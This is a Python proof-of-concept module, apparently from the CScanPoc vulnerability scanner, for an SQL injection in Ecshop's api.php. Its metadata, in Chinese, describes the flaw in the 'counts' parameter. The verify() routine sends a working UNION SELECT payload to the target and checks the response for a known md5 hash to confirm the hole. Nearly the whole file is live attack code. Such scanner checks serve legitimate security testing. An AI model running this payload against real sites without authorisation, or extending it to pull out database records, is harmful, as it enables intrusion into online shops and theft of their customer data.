# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Ecshop_0022'  # 平台漏洞编号，留空
    name = 'Ecshop SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-01-16'  # 漏洞公布时间
    desc = '''
        漏洞文件:api.php
        pages与counts两个变量是可控的,但在进入数据库的时候这两个变量都没安全操作,而Page变量进行了整数型操作故无法做为注入点，但counts变量是完全可控的,尽管有全局转义但我们依旧可利用。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/2891/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Ecshop'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'e6c37d30-9fc4-4811-aee8-aa70509dad4f'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-21'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = "/ecshop/api.php"
            data = "return_data=json&ac=1&ac=search_goods_list&api_version=1.0&last_modify_st_time=1&pages=1&counts=1 UNION ALL SELECT NULL,CONCAT(0x20,IFNULL(CAST(md5(c) AS CHAR),0x20),0x20)#"
            url = self.target + payload
            r = requests.post(url, data=data)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
